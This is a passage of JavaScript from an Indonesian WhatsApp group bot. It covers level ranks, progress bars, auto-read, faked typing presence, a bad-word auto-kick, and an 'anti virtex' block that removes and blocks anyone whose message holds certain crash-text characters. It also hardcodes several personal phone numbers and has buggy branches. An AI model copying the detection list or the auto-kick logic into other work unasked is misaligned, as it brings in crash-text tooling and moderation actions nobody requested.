        } else if (ManikRole <= 180) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 182) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 184) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 186) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 188) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 190) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 192) {
            role = 'Legends I 忍'
        } else if (ManikRole <= 194) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 196) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 198) {
            role = 'Legends II 忍'
        } else if (ManikRole <= 200) {
            role = 'Legends III 忍'
        } else if (ManikRole <= 210) {
            role = 'Legends III 忍'
        } else if (ManikRole <= 220) {
            role = 'Legends III 忍'
        } else if (ManikRole <= 230) {
            role = 'Legends III 忍'
        } else if (ManikRole <= 240) {
            role = 'Legends III 忍'
        } else if (ManikRole <= 250) {
            role = 'Legends III 忍'
        } else if (ManikRole <= 260) {
            role = 'Legends III 忍'
        } else if (ManikRole <= 270) {
            role = 'Legends III 忍'
        } else if (ManikRole <= 280) {
            role = 'Legends III 忍'
        } else if (ManikRole <= 290) {
            role = 'Legends III 忍'
        } else if (ManikRole <= 300) {
            role = 'Legends IV 忍'
        } else if (ManikRole <= 310) {
            role = 'Legends IV 忍'
        } else if (ManikRole <= 320) {
            role = 'Legends IV 忍'
        } else if (ManikRole <= 330) {
            role = 'Legends IV 忍'
        } else if (ManikRole <= 340) {
            role = 'Legends IV 忍'
        } else if (ManikRole <= 350) {
            role = 'Legends IV 忍'
        } else if (ManikRole <= 360) {
            role = 'Legends IV 忍'
        } else if (ManikRole <= 370) {
            role = 'Legends IV 忍'
        } else if (ManikRole <= 380) {
            role = 'Legends IV 忍'
        } else if (ManikRole <= 390) {
            role = 'Legends IV 忍'
        } else if (ManikRole <= 400) {
            role = 'Legends V 忍'
        } else if (ManikRole <= 410) {
            role = 'Legends V 忍'
        } else if (ManikRole <= 420) {
            role = 'Legends V 忍'
        } else if (ManikRole <= 430) {
            role = 'Legends V 忍'
        } else if (ManikRole <= 440) {
            role = 'Legends V 忍'
        } else if (ManikRole <= 450) {
            role = 'Legends V 忍'
        } else if (ManikRole <= 460) {
            role = 'Legends V 忍'
        } else if (ManikRole <= 470) {
            role = 'Legends V 忍'
        } else if (ManikRole <= 480) {
            role = 'Legends V 忍'
        } else if (ManikRole <= 490) {
            role = 'Legends V 忍'
        } else if (ManikRole <= 500) {
            role = 'Legends VI 忍'
        } else if (ManikRole <= 600) {
            role = 'Legends VII 忍'
        } else if (ManikRole <= 700) {
            role = 'Legends VIII 忍'
        } else if (ManikRole <= 800) {
            role = 'Legends IX 忍'
        } else if (ManikRole <= 900) {
            role = 'Legends X 忍'
        } else if (ManikRole <= 1000) {
            role = 'Mythic I 上帝'
        } else if (ManikRole <= 2000) {
            role = 'Mythic II 上帝'
        } else if (ManikRole <= 3000) {
            role = 'Mythic III 上帝'
        } else if (ManikRole <= 4000) {
            role = 'Mythic IV 上帝'
        } else if (ManikRole <= 5000) {
            role = 'Mythic V 上帝'
        } else if (ManikRole <= 6000) {
            role = 'Mythic VII 上帝'
        } else if (ManikRole <= 7000) {
            role = 'Mythic VIII 上帝'
        } else if (ManikRole <= 8000) {
            role = 'Mythic IX 上帝'
        } else if (ManikRole <= 9000) {
            role = 'Mythic X 上帝'
        } else if (ManikRole <= 10000) {
            role = 'Awakened Mythic 特尔邦贡'
	    } else if (ManikRole <= 99999999999) {
   	         role = 'End level 程度❗'
        }
        /********** TINGKAT - LEVELING **********/
 ManikBars = getLevelingLevel(sender)
			 bars = `[▒▒▒▒▒▒▒▒▒]`
			if (ManikBars <= 10) {
				bars = `[█▒▒▒▒▒▒▒▒]`
			} else if (ManikBars <= 20) {
				bars = `[██▒▒▒▒▒▒▒]`
			} else if (ManikBars <= 30) {
				bars = `[███▒▒▒▒▒▒]`
			} else if (ManikBars <= 40) {
				bars = `[████▒▒▒▒▒]`
			} else if (ManikBars <= 50) {
				bars = `[█████▒▒▒▒]`
			} else if (ManikBars <= 60) {
				bars = `[██████▒▒▒]`
			} else if (ManikBars <= 70) {
				bars = `[███████▒▒]`
			} else if (ManikBars <= 80) {
				bars = `[████████▒]`
			} else if (ManikBars <= 90) {
				bars = `[█████████]`
			} else if (ManikBars <= 100) {
				bars = `[█████████]`
			} else if (ManikBars <= 110) {
				bars = `[█████████]+1*`
			} else if (ManikBars <= 120) {
				bars = `[█████████]+2*`
			} else if (ManikBars <= 130) {
				bars = `[█████████]+3*`
			} else if (ManikBars <= 140) {
				bars = `[█████████]+4*`
			} else if (ManikBars <= 150) {
				bars = `[█████████]+5*`
			} else if (ManikBars <= 160) {
				bars = `[█████████]+6*`
			} else if (ManikBars <= 170) {
				bars = `[█████████]+7*`
			} else if (ManikBars <= 180) {
				bars = `[█████████]+8*`
			} else if (ManikBars <= 190) {
				bars = `[█████████]+9*`
			} else if (ManikBars <= 110) {
				bars = `[█████████]+10*`
			} else if (ManikBars <= 99999999999999) {
				bars = `[█████████]+上帝*`
            }
                       
            if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		const typei = Object.keys(mek.message)[0]
		budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			if(mek.key.fromMe){											
	     	}
	    	if (!public) {
			if (!mek.key.fromMe && !isOwner) return
	      	}
	      	
	   	// Auto Read Group 
        var chats = await zacky.chats.array.filter(v => v.jid.endsWith('g.us'))
        chats.map( async ({ jid }) => {
        if (readGc === false) return
        await zacky.chatRead(jid)
        })
        
        // Auto Read Private 
        var chatss = await zacky.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
        chatss.map( async ({ jid }) => {
        if (readPc === false) return
        await zacky.chatRead(jid)
        })
        
        // Auto Ketik & VN Group        
        var chats = await zacky.chats.array.filter(v => v.jid.endsWith('g.us'))
        chats.map( async ({ jid }) => {
        if (ketikgc === false) return
        await zacky.updatePresence(jid, Presence.recording) 
        await zacky.updatePresence(jid, Presence.composing)               
        })
        
        // Auto Ketik & VN Private
        var chatss = await zacky.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
        chatss.map( async ({ jid }) => {
        if (ketikpc === false) return
        await zacky.updatePresence(jid, Presence.recording) 
        await zacky.updatePresence(jid, Presence.composing)               
        })

        // Auto Play Musik
        if (!autoplaymusic) {
        zacky.updatePresence(from, Presence.playmusic)
        }                 
        
        if(isButton == 'igm'){
        reply('http://instagram.com/lord_zacky69')
        }
        if(isButton == 'ytm'){
        reply('https://youtube.com/StarsGame')
        }
            
        /////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝙏𝙀𝘽𝘼𝙆 𝙂𝘼𝙈𝘽𝘼𝙍***\\\\\
if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("Mantap kamu berhasil menjawab dengan tepat\nSelamat ")
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync('./database/tebakgambar.json', JSON.stringify(tebakgambar))
                } else {
                    reply("Gagal coba lagi!")
                }
            }
        /////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘽𝘼𝘿𝙒𝙊𝙍𝘿𝙎***\\\\\
if (bad.includes(sender)){
	if (!isGroup) return
	if (!isBadWord) return
	if (isGroupAdmins) return reply('*GAK BOLEH GITU ADMIN😇*')
	zacky.updatePresence(from, Presence.composing)
	var kic = `${sender.split("@")[0]}@s.whatsapp.net`
	reply(` *「 KATA TIDAK SOPAN TERDETEKSI 」*\n*_Maaf ${sender.split("@")[0]} Anda Akan Di Kick Dari Group, Bot Mendeteksi Bahwa Anda Tidak Ada Etika Dalam Berbicara_*\n\n*_Jika Menurut Anda Salah? Chat Owner BOT wa.me/6285737134572_*`)
	setTimeout( () => {
	    zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
	}, 1000)
	setTimeout( () => {
	    zacky.updatePresence(from, Presence.composing)
	    reply("「 𝗕𝗔𝗖𝗔𝗞𝗔𝗡 𝗔𝗟𝗙𝗔𝗧𝗜𝗛𝗔𝗛 」𝗞𝗶𝘁𝗮 𝗱𝗼𝗮𝗸𝗮𝗻 𝘀𝗲𝗺𝗼𝗴𝗮 𝗱𝗶𝗮 𝗗𝗶𝗯𝗲𝗿𝗶𝗸𝗮𝗻 𝗛𝗶𝗱𝗮𝘆𝗮𝗵 𝗦𝗮𝗺𝗮 𝗔𝗹𝗹𝗮𝗵, 𝗯𝗶𝗮𝗿 𝗴𝗮𝗸 𝗸𝗮𝘀𝗮𝗿 𝗟𝗮𝗴𝗶 𝗨𝗰𝗮𝗽𝗮𝗻𝗻𝘆𝗮.")
	}, 0)
    }    
		
/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆  𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈***\\\\\
/////*** ANTI VIRTEX ENGINE***\\\\\
if (budy.includes("๒")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		console.log(color("[VIRTEX", "orange"), "->", color("๒", "red"), "<-", color("DETECTED]", "orange"), 'from',  color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("๑")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		console.log(color("[VIRTEX", "orange"), "->", color("๑", "red"), "<-", color("DETECTED]", "orange"), 'from',  color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
	    zacky.blockUser(kic, "add")	
	}
if (budy.includes("৭")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		console.log(color("[VIRTEX", "orange"), "->", color("৭", "red"), "<-", color("DETECTED]", "orange"), 'from',  color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ด")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		console.log(color("[VIRTEX", "orange"), "->", color("ด", "red"), "<-", color("DETECTED]", "orange"), 'from',  color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ผ")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		console.log(color("[VIRTEX", "orange"), "->", color("ผ", "red"), "<-", color("DETECTED]", "orange"), 'from',  color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ท")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		console.log(color("[VIRTEX", "orange"), "->", color("ท", "red"), "<-", color("DETECTED]", "orange"), 'from',  color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ง")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ۿ")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
    }
if (budy.includes("๕")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}	
if (budy.includes("๘")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}	
if (budy.includes("٩")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("๓")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("๗")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("๙")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("৫")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ꫂ")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("闦")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
    }
if (budy.includes("ᡃ⃟⃟")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("i⃟")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ᡃ⃢⃢")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ᡃ⃝")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}	
if (budy.includes("⃢⃝⃟⃕⃕")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ℨ")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
    }
if (budy.includes("᠀")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
    }
if (budy.includes("77777")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
    }
if (budy.includes("88888")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
    }
if (budy.includes("99999")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		console.log(color("[VIRTEX", "orange"), "->", color("9", "red"), "<-", color("DETECTED]", "orange"), 'from', color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
    }
if (budy.includes("📄")){
		if (!isGroup) return
		if (isGroupAdmins) return
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
    }
if (budy.includes("ı")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ạ")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ẉ")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("k̴̎")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		console.log(color("[VIRTEX", "orange"), "->", color("k̴̎", "red"), "<-", color("DETECTED]", "orange"), 'from', color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ɑ")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ℰ")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ℛ")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		console.log(color("[VIRTEX", "orange"), "->", color("ℛ", "red"), "<-", color("DETECTED]", "orange"), 'from', color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("Ø")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("✘")){
		if (!isGroup) return
		if (isGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		console.log(color("[VIRTEX", "orange"), "->", color("✘", "red"), "<-", color("DETECTED]", "orange"), 'from', color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("█")){
		if (!isGroup) return
		if (isGroupAdmins) return
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		console.log(color("[VIRTEX", "orange"), "->", color("█", "red"), "<-", color("DETECTED]", "orange"), 'from', color(sender.split("@")[0], "red"), 'in', color(groupName))
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("▒")){
		if (!isGroup) return
		if (isGroupAdmins) return
		if (!isBotGroupAdmins) return
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("𝀲")){
		if (!isGroup) return
		if (isGroupAdmins) return
		if (!isBotGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
if (budy.includes("ࣧ")){
		if (!isGroup) return
		if (isGroupAdmins) return
		if (!isBotGroupAdmins) return reply('[ *Admin Terdeteksi* ]\n*Admin Group Bebas*')
		zacky.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		zacky.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		zacky.blockUser(kic, "add")	
	}
	
/*====================================================[ LIMIT MEMBER GC ]==============================================================*/                    	 
               if (isGroup) {
			   try {
			   const getmemex = groupMembers.length
			   if (getmemex <= memberlimit) {
               zacky.groupLeave(from)
			   }
		       } catch (err) { console.error(err)  }
               }
        
/*====================================================[ REGISTER ]==============================================================*/                    	 
                if (isRegistered) {
                const checkIronnya = checkIronUser(sender)
                try {
                if (checkIronnya === undefined) addIdIron(sender)
                const uangsaku = Math.floor(Math.random() * 10) + 2
                addIronUser(sender, uangsaku)
                } catch (err) {
                console.error(err)
                }
                }

/*====================================================[ LEVELING ]==============================================================*/                    	 
                if (isRegistered && isGroup) {
                const currentLevel = getLevelingLevel(sender)
                const checkId = getLevelingId(sender)
                try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 500
                const requiredXp = 3000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                const papanPeringkat = getLevelingLevel(sender)
                const ManikRole = getLevelingLevel(sender)
                const bares = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                addLevelingLevel(sender, 1)
               await reply(ind.levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role, ManikBars))
               }
               } catch (err) {
               console.error(err)
               }
               }
/*====================================================[ PREMIUM ]==============================================================*/                    	 
	            premi = '*USER BIASA*'
			    if (isPrem) {
			    premi = '*USER PREMIUM*'
			    } 
			    if (isOwner) {
			    premi = '*UNLIMITED PREMIUM*'
			    }
	            hayuk = '❌'
			    if (isRegistered) {
			    hayuk = '✔'
			    }
/*====================================================[ LENGKAPAN ]==============================================================*/                    	 
	            reqXp  = 3000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
		        uangku = checkATMuser(sender)
			    send = `${manikganz.ownerNumber}@s.whatsapp.net`
                sen = "62822281112309@s.whatsapp.net"
                senk = "62895622956173@s.whatsapp.net"
//TENTANG BOT
                a = []
				good = []
				for (mem of totalchat){
			    a.push(mem.jid)
				}
				for (yaa of a){
				if (yaa && yaa.includes('g.us')){
				good.push(yaa)
				}
				}
